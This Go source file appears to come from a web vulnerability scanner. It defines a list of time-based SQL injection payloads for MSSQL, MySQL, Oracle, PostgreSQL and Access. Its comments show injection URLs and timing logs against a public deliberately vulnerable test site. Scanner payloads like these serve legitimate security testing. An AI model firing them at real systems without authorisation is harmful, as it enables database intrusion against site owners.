/**
* @Author: shaochuyu
* @Date: 5/7/2022 11:30
 */
package sqli_payload

import (
	"fmt"
	"strconv"
)

type ExactDelay struct {
	delayFmt        string
	delayDelta      int
	delayMultiplier int
	dbms            string
}

func NewExactDelay(delayFmt, dbms string, delta, mult int) *ExactDelay {
	return &ExactDelay{
		delayFmt:        delayFmt,
		delayDelta:      delta,
		delayMultiplier: mult,
		dbms:            dbms,
	}
}

func (ed *ExactDelay) GetStringForDelay(seconds int) string {
	res := (seconds * ed.delayMultiplier) + ed.delayDelta
	return fmt.Sprintf(ed.delayFmt, strconv.Itoa(res))
}

func (ed *ExactDelay) GetDBMS() string {
	return ed.dbms
}

func (ed *ExactDelay) SetDelayDelta(delta int) {
	ed.delayDelta = delta
}

func (ed *ExactDelay) SetMultiplier(mult int) {
	ed.delayMultiplier = mult
}

//http://testphp.vulnweb.com/listproducts.php?cat=18/**/and+0=0
//http://testphp.vulnweb.com/listproducts.php?cat=18/**/and+3=6
//boolean based handling key: cat pvalue: 18/**/and+0=0 nvalue: 18/**/and+3=6 pn 100 pt 100

//http://testphp.vulnweb.com/listproducts.php?cat=18'and'k'='k
//http://testphp.vulnweb.com/listproducts.php?cat=18'and'a'='z
//boolean based handling key: cat pvalue: 18'and'k'='k nvalue: 18'and'a'='z pn 99 pt 91

//http://testphp.vulnweb.com/listproducts.php?cat=18"and"h"="h
//http://testphp.vulnweb.com/listproducts.php?cat=18"and"d"="n
// boolean based handling key: cat pvalue: 18"and"h"="h nvalue: 18"and"d"="n pn 99 pt 91

//http://testphp.vulnweb.com/listproducts.php?cat=(select*from(select+sleep(0)union/**/select+1)a)
//http://testphp.vulnweb.com/listproducts.php?cat=(select*from(select+sleep(2)union/**/select+1)a)
//http://testphp.vulnweb.com/listproducts.php?cat=(select*from(select+sleep(3)union/**/select+1)a)
//http://testphp.vulnweb.com/listproducts.php?cat=(select*from(select+sleep(3)union/**/select+1)a)
//http://testphp.vulnweb.com/listproducts.php?cat=(select*from(select+sleep(3)union/**/select+1)a)

// sql normal stat http://testphp.vulnweb.com/listproducts.php?cat=18 [189 189 182 186 180 187] avg 185.5 stddev 3.4034296427770228 sleep 2
// time based handling http://testphp.vulnweb.com/listproducts.php?cat=18 cat (select*from(select+sleep(2)union/**/select+1)a) p 188 n 2178 s 2
// verify time based http://testphp.vulnweb.com/listproducts.php?cat=18 param cat value (select*from(select+sleep(3)union/**/select+1)a) sleep 3s
// verify time based http://testphp.vulnweb.com/listproducts.php?cat=18 param cat value (select*from(select+sleep(3)union/**/select+1)a) sleep 3s
// p_time           "188"
// n_time           "2178"
// stat             "{\"normal\":{\"samples\":[189,189,182,186,180,187],\"avg\":185.5,\"std_dev\":3.4034296427770228,\"sleep_time\":2},\"sleep_0_time\":188,\"quick_check\":{\"samples\":[2178],\"sleep\":2},\"verify\":{\"samples\":[3183,3189,3187],\"sleep\":3}}"
// title            "Generic MySQL time based case [number/column]"
// type             "time_based"
// avg_time         "185"
// std_dev          "3"
// sleep_time       "2000"

// /hotel/hotel.php?cid=(select(0)from(select(sleep(6)))v)/*'+(select(0)from(select(sleep(6)))v)+'"+(select(0)from(select(sleep(6)))v)+"*/&id=56
// cid=350'XOR(35*if(now()=sysdate(),sleep(6),0))XOR'Z&k=pp&q=1
// /About/index/id/1*if(now()=sysdate(),sleep(6),0)
// ; waitfor delay '0:0:7' --
// -1 OR 3*2*1=6 AND 00093=00093
func GetExactDelay() []*ExactDelay {
	return []*ExactDelay{
		// MSSQL
		NewExactDelay("1;waitfor delay '0:0:%s'--", "MSSQL", 0, 1),
		NewExactDelay("1);waitfor delay '0:0:%s'--", "MSSQL", 0, 1),
		NewExactDelay("1));waitfor delay '0:0:%s'--", "MSSQL", 0, 1),
		NewExactDelay("1';waitfor delay '0:0:%s'--", "MSSQL", 0, 1),
		NewExactDelay("1');waitfor delay '0:0:%s'--", "MSSQL", 0, 1),
		NewExactDelay("1'));waitfor delay '0:0:%s'--", "MSSQL", 0, 1),

		// MySQL 5
		NewExactDelay("1 or BENCHMARK(%s,MD5(1))", "MYSQL", 0, 500000),
		NewExactDelay("1' or BENCHMARK(%s,MD5(1)) or '1'='1", "MYSQL", 0, 500000),
		NewExactDelay(`1" or BENCHMARK(%s,MD5(1)) or "1"="1`, "MYSQL", 0, 500000),
		NewExactDelay("1 AND (SELECT * FROM (SELECT(SLEEP(%s)))A)", "MYSQL", 0, 1),
		NewExactDelay("1 OR (SELECT * FROM (SELECT(SLEEP(%s)))A)", "MYSQL", 0, 1),

		// Single and double quote string concat
		NewExactDelay("'+(SELECT * FROM (SELECT(SLEEP(%s)))A)+'", "MYSQL", 0, 1),
		NewExactDelay(`"+(SELECT * FROM (SELECT(SLEEP(%s)))A)+"`, "MYSQL", 0, 1),

		// These are required, they don't cover the same case than the previous
		// ones (string concat).
		NewExactDelay("' AND (SELECT * FROM (SELECT(SLEEP(%s)))A) AND '1'='1", "MYSQL", 0, 1),
		NewExactDelay(`" AND (SELECT * FROM (SELECT(SLEEP(%s)))A) AND "1"="1`, "MYSQL", 0, 1),
		NewExactDelay("' OR (SELECT * FROM (SELECT(SLEEP(%s)))A) OR '1'='2", "MYSQL", 0, 1),
		NewExactDelay(`" OR (SELECT * FROM (SELECT(SLEEP(%s)))A) OR "1"="2`, "MYSQL", 0, 1),

		// Oracle
		NewExactDelay("1 AND 2822=DBMS_PIPE.RECEIVE_MESSAGE(CHR(73)||CHR(82)||CHR(90)||CHR(77),%s)", "ORACLE", 0, 1),
		NewExactDelay("1' AND 2822=DBMS_PIPE.RECEIVE_MESSAGE(CHR(73)||CHR(82)||CHR(90)||CHR(77),%s)", "ORACLE", 0, 1),
		NewExactDelay(`1" AND 2822=DBMS_PIPE.RECEIVE_MESSAGE(CHR(73)||CHR(82)||CHR(90)||CHR(77),%s)`, "ORACLE", 0, 1),

		// PostgreSQL
		NewExactDelay("1 or pg_sleep(%s)", "POSTGRE", 0, 1),
		NewExactDelay("1' or pg_sleep(%s) and '1'='1", "POSTGRE", 0, 1),
		NewExactDelay(`1" or pg_sleep(%s) and "1"="1`, "POSTGRE", 0, 1),
		// Access
		NewExactDelay("1 or sleep(%s)", "ACCESS", 0, 1),
		NewExactDelay("1' or sleep(%s)", "ACCESS", 0, 1),
		NewExactDelay(`1" or sleep(%s)`, "ACCESS", 0, 1),
	}
}
